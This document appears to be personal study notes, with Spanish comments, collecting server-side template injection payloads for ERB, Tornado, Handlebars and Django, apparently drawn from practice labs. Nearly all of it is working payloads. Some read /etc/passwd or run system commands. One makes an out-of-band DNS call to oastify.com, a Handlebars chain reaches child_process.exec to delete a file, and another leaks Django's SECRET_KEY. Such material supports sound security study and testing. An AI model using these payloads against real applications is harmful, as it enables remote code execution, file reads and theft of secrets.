## ERB (ruby)

```
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
<%= system('cat /etc/passwd') %>
```

## Tornado (python)
```
{{7*7}}
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

en este lab podías cambiar tu nick y se veía reflejado en los comentarios que ponías


## Handlebars

```
wrtz{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
```

recordar que si está en una url hay que encodearlo

## Django secret key

{{settings.SECRET_KEY}}

el payload sale de hacer {% debug %} y que salgan todas las clases a las que tenemos acceso y viendo la documentacion encontramos {{settings.SECRET_KEY}}
